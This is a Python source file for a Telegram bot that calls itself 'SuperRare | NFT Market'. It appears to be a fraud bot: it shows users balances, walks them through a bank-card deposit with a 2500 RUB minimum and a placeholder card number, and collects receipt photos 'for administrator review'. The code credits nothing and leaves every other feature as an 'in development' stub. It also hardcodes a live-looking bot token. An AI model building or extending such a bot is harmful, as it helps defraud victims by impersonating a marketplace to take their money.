import sqlite3
import requests
import datetime
import time
import os

# ==================== КОНФИГ ====================
BOT_TOKEN = "8583960432:AAFnqFYa9iHn-08KM1HQnJpLG3qQ3zUdPdY"
BASE_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"

TEXTS = {
    "ru": {
        "choose_currency": "Выберите валюту",
        "main_menu": "Главное меню",
        "personal_account": "Личный кабинет",
        "nft": "NFT",
        "info": "Инфо",
        "support": "Тех. Поддержка",
        "in_development": "Раздел в разработке",
        "deposit_methods": "Выберите удобный для вас метод пополнения.",
        "enter_amount": "Введите сумму пополнения от {min_amount} {currency}",
        "payment_created": "Создана заявка на оплату\n\nДля пополнения переведите указанную сумму по номеру карты.\n\n---\n\n✅ Карта: {card_number}\n✅ Сумма: {amount} {currency}\n\n---\n\n**Реквизиты действительны 10 минут.**",
        "send_receipt": "Просим направить фотографию квитанции об оплате.\n\nОбращаем внимание: отправка допускается исключительно в переписке с ботом.",
        "payment_cancelled": "Заявка на оплату отменена.",
        "personal_account_text": """**SuperRare | NFT Market**

---

## Личный кабинет

Баланс: {balance} {currency}
На выводе: {withdrawal_balance} {currency}

Оборот транзакций: {turnover} {currency}

Верификация: {verification_status}
Ваш айди: {user_id}

Дата и время: {current_time}
---"""
    },
    "en": {
        "choose_currency": "Choose currency",
        "main_menu": "Main menu",
        "personal_account": "Personal account",
        "nft": "NFT",
        "info": "Info",
        "support": "Support",
        "in_development": "Section in development",
        "deposit_methods": "Choose a convenient deposit method for you.",
        "enter_amount": "Enter deposit amount from {min_amount} {currency}",
        "payment_created": "Payment request created\n\nTo top up, transfer the specified amount to the card number.\n\n---\n\n✅ Card: {card_number}\n✅ Amount: {amount} {currency}\n\n---\n\n**Details are valid for 10 minutes.**",
        "send_receipt": "Please send a photo of the payment receipt.\n\nPlease note: sending is allowed only in correspondence with the bot.",
        "payment_cancelled": "Payment request cancelled.",
        "personal_account_text": """**SuperRare | NFT Market**

---

## Personal Account

Balance: {balance} {currency}
On withdrawal: {withdrawal_balance} {currency}

Transaction turnover: {turnover} {currency}

Verification: {verification_status}
Your ID: {user_id}

Date and time: {current_time}
---"""
    }
}

# ==================== КЛАВИАТУРЫ ====================
def agreement_keyboard(lang='ru'):
    text = "✅ Принять" if lang == 'ru' else "✅ Accept"
    return {
        "keyboard": [[{"text": text}]],
        "resize_keyboard": True
    }

def language_keyboard():
    return {
        "keyboard": [
            [{"text": "Русский"}],
            [{"text": "English"}]
        ],
        "resize_keyboard": True
    }

def currency_keyboard():
    return {
        "keyboard": [
            [{"text": "RUB"}, {"text": "UAH"}, {"text": "KZT"}],
            [{"text": "BYN"}, {"text": "EUR"}, {"text": "USD"}]
        ],
        "resize_keyboard": True
    }

def main_menu_keyboard(lang='ru'):
    personal_text = "Личный кабинет" if lang == 'ru' else "Personal account"
    nft_text = "NFT" if lang == 'ru' else "NFT"
    info_text = "Инфо" if lang == 'ru' else "Info"
    support_text = "Тех. Поддержка" if lang == 'ru' else "Support"

    return {
        "keyboard": [
            [{"text": "📊 " + personal_text}],
            [{"text": "💎 " + nft_text}],
            [{"text": "ℹ️ " + info_text}],
            [{"text": "🆘 " + support_text}]
        ],
        "resize_keyboard": True
    }

def personal_account_keyboard(lang='ru'):
    deposit_text = "Пополнить" if lang == 'ru' else "Deposit"
    withdraw_text = "Вывести" if lang == 'ru' else "Withdraw"
    transactions_text = "Транзакции" if lang == 'ru' else "Transactions"
    verification_text = "Верификация" if lang == 'ru' else "Verification"
    favorites_text = "Избранное" if lang == 'ru' else "Favorites"
    my_nft_text = "Мои NFT" if lang == 'ru' else "My NFT"
    create_nft_text = "Создать NFT" if lang == 'ru' else "Create NFT"
    settings_text = "Настройки" if lang == 'ru' else "Settings"
    menu_text = "Меню" if lang == 'ru' else "Menu"

    return {
        "keyboard": [
            [{"text": deposit_text}, {"text": withdraw_text}],
            [{"text": transactions_text}, {"text": verification_text}],
            [{"text": favorites_text}, {"text": my_nft_text}],
            [{"text": create_nft_text}],
            [{"text": settings_text}, {"text": menu_text}]
        ],
        "resize_keyboard": True
    }

def deposit_methods_keyboard(lang='ru'):
    bank_card_text = "Пополнить через банковскую карту" if lang == 'ru' else "Deposit by bank card"
    promocode_text = "Промокод" if lang == 'ru' else "Promocode"
    back_text = "Назад" if lang == 'ru' else "Back"

    return {
        "keyboard": [
            [{"text": bank_card_text}],
            [{"text": promocode_text}],
            [{"text": back_text}]
        ],
        "resize_keyboard": True
    }

def payment_confirmation_keyboard(lang='ru'):
    paid_text = "Я оплатил(а) ✅" if lang == 'ru' else "I paid ✅"
    cancel_text = "Отменить" if lang == 'ru' else "Cancel"

    return {
        "keyboard": [
            [{"text": paid_text}],
            [{"text": cancel_text}]
        ],
        "resize_keyboard": True
    }

def back_keyboard(lang='ru'):
    back_text = "Назад" if lang == 'ru' else "Back"
    return {
        "keyboard": [[{"text": back_text}]],
        "resize_keyboard": True
    }

# ==================== БАЗА ДАННЫХ ====================
def init_db():
    if os.path.exists('superrare.db'):
        os.remove('superrare.db')

    conn = sqlite3.connect('superrare.db')
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            username TEXT,
            full_name TEXT,
            language TEXT DEFAULT 'ru',
            currency TEXT,
            balance REAL DEFAULT 0.0,
            withdrawal_balance REAL DEFAULT 0.0,
            turnover REAL DEFAULT 0.0,
            verified INTEGER DEFAULT 0,
            agreed INTEGER DEFAULT 0,
            state TEXT DEFAULT 'start',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    ''')

    cursor.execute('''
        CREATE TABLE IF NOT EXISTS payments (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER,
            amount REAL,
            currency TEXT,
            card_number TEXT,
            status TEXT DEFAULT 'pending',
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
            FOREIGN KEY (user_id) REFERENCES users (user_id)
        )
    ''')

    conn.commit()
    conn.close()
    print("База данных создана!")

# ==================== УТИЛИТЫ ====================
def get_user_data(user_id):
    conn = sqlite3.connect('superrare.db')
    cursor = conn.cursor()
    cursor.execute('SELECT state, username, language, currency FROM users WHERE user_id = ?', (user_id,))
    result = cursor.fetchone()
    conn.close()
    return result

def update_user_state(user_id, state):
    conn = sqlite3.connect('superrare.db')
    cursor = conn.cursor()
    cursor.execute('UPDATE users SET state = ? WHERE user_id = ?', (state, user_id))
    conn.commit()
    conn.close()

def create_payment(user_id, amount, currency):
    conn = sqlite3.connect('superrare.db')
    cursor = conn.cursor()
    cursor.execute(
        'INSERT INTO payments (user_id, amount, currency, card_number) VALUES (?, ?, ?, ?)',
        (user_id, amount, currency, '[НОМЕР КАРТЫ ДЛЯ ОПЛАТЫ]')
    )
    payment_id = cursor.lastrowid
    conn.commit()
    conn.close()
    return payment_id

# ==================== ОТПРАВКА СООБЩЕНИЙ ====================
def send_message(chat_id, text, reply_markup=None, parse_mode="Markdown"):
    url = f"{BASE_URL}/sendMessage"
    data = {
        "chat_id": chat_id,
        "text": text
    }
    if parse_mode:
        data["parse_mode"] = parse_mode
    if reply_markup:
        data["reply_markup"] = reply_markup

    for attempt in range(3):
        try:
            response = requests.post(url, json=data, timeout=10, proxies={})
            if response.status_code == 200:
                return response.json()
            else:
                print(f"Попытка {attempt + 1}: Ошибка HTTP: {response.status_code}")
        except Exception as e:
            print(f"Попытка {attempt + 1}: Ошибка: {e}")

        if attempt < 2:
            time.sleep(2)

    return None

def get_updates(offset, timeout=25):
    for attempt in range(3):
        try:
            url = f"{BASE_URL}/getUpdates"
            params = {"offset": offset, "timeout": timeout}
            response = requests.get(url, params=params, timeout=timeout + 5, proxies={})

            if response.status_code == 200:
                return response.json()
            else:
                print(f"Попытка {attempt + 1}: Ошибка получения: {response.status_code}")
        except Exception as e:
            print(f"Попытка {attempt + 1}: Ошибка: {e}")

        if attempt < 2:
            time.sleep(2)

    return None

# ==================== ОСНОВНОЙ ЦИКЛ ====================
def bot_polling():
    init_db()
    print("🚀 Бот запущен!")

    offset = 0
    while True:
        try:
            updates = get_updates(offset)

            if updates and updates.get("result"):
                for update in updates["result"]:
                    offset = update["update_id"] + 1
                    message = update.get("message")

                    if message:
                        user_id = message["from"]["id"]
                        text = message.get("text", "")
                        username = message["from"].get("username", "")
                        first_name = message["from"].get("first_name", "")

                        user_data = get_user_data(user_id)

                        if not user_data:
                            conn = sqlite3.connect('superrare.db')
                            cursor = conn.cursor()
                            cursor.execute(
                                'INSERT INTO users (user_id, username, full_name, state) VALUES (?, ?, ?, ?)',
                                (user_id, username, first_name, 'agreement')
                            )
                            conn.commit()
                            conn.close()

                            display_name = f"@{username}" if username else first_name
                            agreement_text = f"""Привет, **{display_name}!**

Политика и условия пользования данным ботом.

Спасибо за понимание, Ваш **SuperRare | NFT Market**"""

                            send_message(user_id, agreement_text, agreement_keyboard())

                        else:
                            state, db_username, language, currency = user_data
                            lang = language or 'ru'
                            curr = currency or 'RUB'

                            if state == 'agreement':
                                accept_text = "✅ Принять" if lang == 'ru' else "✅ Accept"
                                if text == accept_text:
                                    update_user_state(user_id, 'language')
                                    send_message(user_id, "Выберите язык", language_keyboard())

                            elif state == 'language':
                                if text == "Русский":
                                    conn = sqlite3.connect('superrare.db')
                                    cursor = conn.cursor()
                                    cursor.execute('UPDATE users SET language = ? WHERE user_id = ?', ('ru', user_id))
                                    conn.commit()
                                    conn.close()
                                    update_user_state(user_id, 'currency')
                                    send_message(user_id, "Выберите валюту", currency_keyboard())

                                elif text == "English":
                                    conn = sqlite3.connect('superrare.db')
                                    cursor = conn.cursor()
                                    cursor.execute('UPDATE users SET language = ? WHERE user_id = ?', ('en', user_id))
                                    conn.commit()
                                    conn.close()
                                    update_user_state(user_id, 'currency')
                                    send_message(user_id, "Choose currency", currency_keyboard())

                            elif state == 'currency':
                                if text in ["RUB", "UAH", "KZT", "BYN", "EUR", "USD"]:
                                    conn = sqlite3.connect('superrare.db')
                                    cursor = conn.cursor()
                                    cursor.execute('UPDATE users SET currency = ?, state = ? WHERE user_id = ?', (text, 'main_menu', user_id))
                                    conn.commit()
                                    conn.close()

                                    user_data = get_user_data(user_id)
                                    lang = user_data[2] or 'ru'
                                    send_message(user_id, TEXTS[lang]["main_menu"], main_menu_keyboard(lang))

                            elif state == 'main_menu':
                                user_data = get_user_data(user_id)
                                lang = user_data[2] or 'ru'
                                text_obj = TEXTS[lang]

                                if text == "📊 " + text_obj["personal_account"]:
                                    conn = sqlite3.connect('superrare.db')
                                    cursor = conn.cursor()
                                    cursor.execute('SELECT balance, withdrawal_balance, turnover, verified, currency FROM users WHERE user_id = ?', (user_id,))
                                    user = cursor.fetchone()
                                    conn.close()

                                    if user:
                                        balance, withdrawal_balance, turnover, verified, currency = user
                                        verification_status = "✅ Верифицирован" if verified else "💬 Не верифицирован"
                                        if lang == 'en':
                                            verification_status = "✅ Verified" if verified else "💬 Not verified"

                                        current_time = datetime.datetime.now().strftime("%d.%m.%Y %H:%M:%S")

                                        account_text = text_obj["personal_account_text"].format(
                                            balance=balance,
                                            withdrawal_balance=withdrawal_balance,
                                            turnover=turnover,
                                            verification_status=verification_status,
                                            user_id=user_id,
                                            current_time=current_time,
                                            currency=currency
                                        )

                                        send_message(user_id, account_text, personal_account_keyboard(lang))
                                        update_user_state(user_id, 'personal_account')

                                elif text in ["💎 " + text_obj["nft"], "ℹ️ " + text_obj["info"], "🆘 " + text_obj["support"]]:
                                    send_message(user_id, text_obj["in_development"])

                            elif state == 'personal_account':
                                user_data = get_user_data(user_id)
                                lang = user_data[2] or 'ru'
                                text_obj = TEXTS[lang]
                                curr = user_data[3] or 'RUB'

                                deposit_text = "Пополнить" if lang == 'ru' else "Deposit"
                                menu_text = "Меню" if lang == 'ru' else "Menu"
                                back_text = "Назад" if lang == 'ru' else "Back"

                                if text == deposit_text:
                                    update_user_state(user_id, 'deposit_methods')
                                    send_message(user_id, text_obj["deposit_methods"], deposit_methods_keyboard(lang))

                                elif text == menu_text:
                                    update_user_state(user_id, 'main_menu')
                                    send_message(user_id, text_obj["main_menu"], main_menu_keyboard(lang))

                                elif text == back_text:
                                    update_user_state(user_id, 'main_menu')
                                    send_message(user_id, text_obj["main_menu"], main_menu_keyboard(lang))

                            elif state == 'deposit_methods':
                                user_data = get_user_data(user_id)
                                lang = user_data[2] or 'ru'
                                text_obj = TEXTS[lang]
                                curr = user_data[3] or 'RUB'

                                bank_card_text = "Пополнить через банковскую карту" if lang == 'ru' else "Deposit by bank card"
                                back_text = "Назад" if lang == 'ru' else "Back"

                                if text == bank_card_text:
                                    update_user_state(user_id, 'enter_amount')
                                    min_amount = 2500.0 if curr == 'RUB' else 50.0
                                    send_message(user_id, text_obj["enter_amount"].format(min_amount=min_amount, currency=curr), back_keyboard(lang))

                                elif text == back_text:
                                    update_user_state(user_id, 'personal_account')
                                    user_data = get_user_data(user_id)
                                    lang = user_data[2] or 'ru'
                                    send_message(user_id, TEXTS[lang]["personal_account"], personal_account_keyboard(lang))

                            elif state == 'enter_amount':
                                user_data = get_user_data(user_id)
                                lang = user_data[2] or 'ru'
                                text_obj = TEXTS[lang]
                                curr = user_data[3] or 'RUB'

                                back_text = "Назад" if lang == 'ru' else "Back"

                                if text == back_text:
                                    update_user_state(user_id, 'deposit_methods')
                                    send_message(user_id, text_obj["deposit_methods"], deposit_methods_keyboard(lang))

                                else:
                                    try:
                                        amount = float(text)
                                        min_amount = 2500.0 if curr == 'RUB' else 50.0

                                        if amount >= min_amount:
                                            create_payment(user_id, amount, curr)

                                            payment_text = text_obj["payment_created"].format(
                                                card_number="[НОМЕР КАРТЫ ДЛЯ ОПЛАТЫ]",
                                                amount=amount,
                                                currency=curr
                                            )

                                            update_user_state(user_id, 'payment_confirmation')
                                            send_message(user_id, payment_text, payment_confirmation_keyboard(lang))
                                        else:
                                            send_message(user_id, f"Минимальная сумма: {min_amount} {curr}")

                                    except ValueError:
                                        send_message(user_id, "Пожалуйста, введите число")

                            elif state == 'payment_confirmation':
                                user_data = get_user_data(user_id)
                                lang = user_data[2] or 'ru'
                                text_obj = TEXTS[lang]

                                paid_text = "Я оплатил(а) ✅" if lang == 'ru' else "I paid ✅"
                                cancel_text = "Отменить" if lang == 'ru' else "Cancel"

                                if text == paid_text:
                                    update_user_state(user_id, 'send_receipt')
                                    send_message(user_id, text_obj["send_receipt"], back_keyboard(lang))

                                elif text == cancel_text:
                                    update_user_state(user_id, 'deposit_methods')
                                    send_message(user_id, text_obj["payment_cancelled"], deposit_methods_keyboard(lang))

                                elif text in ["Назад", "Back"]:
                                    update_user_state(user_id, 'enter_amount')
                                    min_amount = 2500.0 if curr == 'RUB' else 50.0
                                    send_message(user_id, text_obj["enter_amount"].format(min_amount=min_amount, currency=curr), back_keyboard(lang))

                            elif state == 'send_receipt':
                                user_data = get_user_data(user_id)
                                lang = user_data[2] or 'ru'
                                text_obj = TEXTS[lang]

                                back_text = "Назад" if lang == 'ru' else "Back"

                                if text == back_text:
                                    update_user_state(user_id, 'payment_confirmation')
                                    send_message(user_id, "Вернулись к подтверждению оплаты", payment_confirmation_keyboard(lang))
                                else:
                                    if message.get('photo') or message.get('document'):
                                        send_message(user_id, "Квитанция получена. Ожидайте проверки администратором.")
                                        update_user_state(user_id, 'personal_account')
                                        send_message(user_id, text_obj["personal_account"], personal_account_keyboard(lang))
                                    else:
                                        send_message(user_id, "Пожалуйста, отправьте фото квитанции об оплате")

            time.sleep(1)

        except Exception as e:
            print(f"Ошибка в основном цикле: {e}")
            time.sleep(5)

if __name__ == "__main__":
    bot_polling()
